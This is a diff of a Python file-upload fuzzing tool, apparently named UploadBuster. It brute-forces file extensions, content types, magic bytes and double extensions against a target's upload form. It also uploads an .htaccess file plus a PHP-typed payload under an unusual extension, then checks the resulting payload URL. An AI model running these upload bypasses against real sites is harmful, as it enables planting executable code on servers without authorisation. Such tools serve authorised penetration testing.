@@ -1,4 +1,15 @@
+print('''
+   __  __      __                ______      
+  / / / /___  / /___  ____ _____/ / __ )__  _______/ /____  _____
+ / / / / __ \/ / __ \/ __ `/ __  / __  / / / / ___/ __/ _ \/ ___/
+/ /_/ / /_/ / / /_/ / /_/ / /_/ / /_/ / /_/ (__  ) /_/  __/ /    
+\____/ .___/_/\____/\__,_/\__,_/_____/\__,_/____/\__/\___/_/     
+    /_/                                                          
+''')
+
 from random import randint, choice
+from bs4 import BeautifulSoup
+import urllib.parse
 import requests
 import json
 import argparse
@@ -44,21 +55,22 @@ def args_handler():
     parser.add_argument("-re", "--request-redirects", action='store_true', help='Request Redirects flag.')
 
     # modes
-    parser.add_argument("-a", "--all-tests", help="Make the full test of Unrestricted File Upload on target",
+    modes = parser.add_mutually_exclusive_group(required=True)
+    modes.add_argument("-a", "--all-tests", help="Make the full test of Unrestricted File Upload on target",
                         action='store_true')
-    parser.add_argument("-be", "--bruteforce-extension", help='Extension Brute forcing.', action='store_true')
-    parser.add_argument("-bn", "--bruteforce-null-extension", help='Null Extension Brute forcing.', action='store_true')
-    parser.add_argument("-bc", "--bruteforce-content-type", help='Content-Type field Brute forcing. ',
+    modes.add_argument("-be", "--bruteforce-extension", help='Extension Brute forcing.', action='store_true')
+    modes.add_argument("-bn", "--bruteforce-null-extension", help='Null Extension Brute forcing.', action='store_true')
+    modes.add_argument("-bc", "--bruteforce-content-type", help='Content-Type field Brute forcing. ',
                         action='store_true')
-    parser.add_argument("-by", "--bruteforce-magic-bytes", help='Magic-bytes Brute forcing. ',
+    modes.add_argument("-by", "--bruteforce-magic-bytes", help='Magic-bytes Brute forcing. ',
                         action='store_true')
-    parser.add_argument("-bm", "--bruteforce-multi-extension", default=0, type=int, metavar='',
+    modes.add_argument("-bm", "--bruteforce-multi-extension", default=0, type=int, metavar='',
                         help='Tries to brute force using double extension technique. can add the number of times to inject the extensions. (-bm [3] = jpg.php.php.php) ', )
-    parser.add_argument("-br", "--bruteforce-reverse-multi-extension", default=0, type=int, metavar='',
+    modes.add_argument("-br", "--bruteforce-reverse-multi-extension", default=0, type=int, metavar='',
                         help='Tries to brute force using double extension technique. can add the number of times to inject the extensions. (-bm [3] = jpg.php.php.php) ', )
-    parser.add_argument("-bl", "--bruteforce-filename-limit", help='Content-Type field Brute forcing. ',
+    modes.add_argument("-bl", "--bruteforce-filename-limit", help='Content-Type field Brute forcing. ',
                         action='store_true')
-    parser.add_argument("-db", "--dont-brute", action='store_true',
+    modes.add_argument("-db", "--dont-brute", action='store_true',
                         help='if success message is found stop all tests. ')
 
     # tech
@@ -109,8 +121,9 @@ class UploadBuster:
         self.payload_filename_full = self.payload_file_name + self.args_backend
         self.payload_content_type = str()
         self.payload_data = str()
-        self.payload_herf_link = str()
+        self.payload_href_link = str()
         self.payload_link_status_code = int()
+        self._payload_url = str()
 
         # response
         self.response_success_message_line = str()
@@ -173,7 +186,6 @@ class UploadBuster:
     def _bruter_file_ext(self):
         print(self._configuration['config']['+']['_bruter_file_ext'])
         for self.payload_file_ext in self._configuration['exts'][self.args_backend]:
-            self._add_random_lower_and_upper_case_ext()
             self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
 
     def _bruter_null_file_ext(self):
@@ -228,11 +240,13 @@ class UploadBuster:
             self._set_payload_file_ext("")
             self._set_payload_content_type("application/x-php")
             self.args_user_payload_file_name = ".htaccess"
-            self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
+            self._mode_name = inspect.currentframe().f_code.co_name
+            self._refresh_format()
+            self._send_post_request()
 
         def upload_new_payload():
             self._add_random_file_name_to_payload()
-            self._set_payload_file_ext(".hph")
+            self._set_payload_file_ext(".wtf")
             self._set_payload_content_type("application/x-php")
             self.args_user_payload_file_name = self.args.payload
             self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
@@ -246,15 +260,42 @@ class UploadBuster:
         self._send_formatted_request_print(inspect.currentframe().f_code.co_name)
 
     # validation
-    def _extract_html_atribute_links_from_string(self, _string, _attribute_name):
-        self.payload_herf_link = re.findall(re.compile(f'{_attribute_name}="([^"]*)"'), _string)
+    def _extract_html_attribute_links_from_string(self, _string, _attribute_name):
+        self.payload_href_link = re.findall(re.compile(f'{_attribute_name}="([^"]*)"'), _string)
+
+    def _build_payload_url_link(self):
+        self._payload_url = urllib.parse.urljoin(self.request_url, self.payload_href_link[0])
+
+    def _extract_strings_from_html(self, _req):
+        soup = BeautifulSoup(_req)
+        print(soup.text.replace('\n',' '))
 
     def _check_site_alive(self):
-        _req = requests.get(self.request_url+self.self.payload_herf_link)
-        if _req.status_code == 200:
-            self.payload_link_status_code = _req.status_code
+        _req = requests.get(self._payload_url)
+        self.payload_link_status_code = _req.status_code
+        if self.payload_link_status_code == 200:
+            # if _string in _req.text:
+            return _req
         else:
-            print(f"not... {_req.status_code}")
+            pass
+
+
+    def _get_strings_from_html(self):
+        _req = self._check_site_alive()
+        try:
+            _req = _req.text.split(' ')
+            new_list = list(filter(None, _req))
+        except:
+            pass
+
+
+    def validation_main(self):
+        self._build_payload_url_link()
+        self._get_strings_from_html()
+        # self._extract_strings_from_html()
+        # validation part
+        pass
+
 
     # core
 
@@ -275,7 +316,7 @@ class UploadBuster:
 
     def _print_init(self, _mode: str = None):
         if self._if_success() and self.args.verbal_success:
-            print(self._configuration['config']['+']['success_message'])
+            print(self._configuration['config']['+']['success_message']+f" PAYLOAD LINK: {self._payload_url} [{self.payload_link_status_code}]")
         if self.args.print_i:
             print(f'POST {self.request_url}\n{self.request_headers}\n{self.request_files} ')
         if self.args.print_o:
@@ -293,7 +334,7 @@ class UploadBuster:
         + ~~~~~~~~~~~~~~~~~~~~~~~~~~
         > SUCCESS LINE: {self.response_success_message_line}
         + ~~~~~~~~~~~~~~~~~~~~~~~~~~
-        > PAYLOAD LINK: {self.payload_herf_link} [{self.payload_link_status_code}]
+        > PAYLOAD LINK: {self._payload_url} [{self.payload_link_status_code}]
         ''')
 
         if self.args.dont_brute and self._if_success():
@@ -304,8 +345,8 @@ class UploadBuster:
             if self.args_success_message.lower() in _line.lower():
                 self.response_success_message_line = _line.strip()
                 self._success_payloads(self._request_count,str(f"{self._mode_name} ||| {self.request_data} ||| {self.request_files}"))
-                self._extract_html_atribute_links_from_string(self.response_success_message_line,'href')
-                self._check_site_alive()
+                self._extract_html_attribute_links_from_string(self.response_success_message_line,'href')
+                self.validation_main()
                 return True
         else:
             return False
@@ -370,5 +411,8 @@ class UploadBuster:
 
 
 if __name__ == '__main__':
-    print(___banner)
-    UploadBuster().main()
+    try:
+        print(___banner)
+        UploadBuster().main()
+    except KeyboardInterrupt:
+        print("[!] Exiting...")
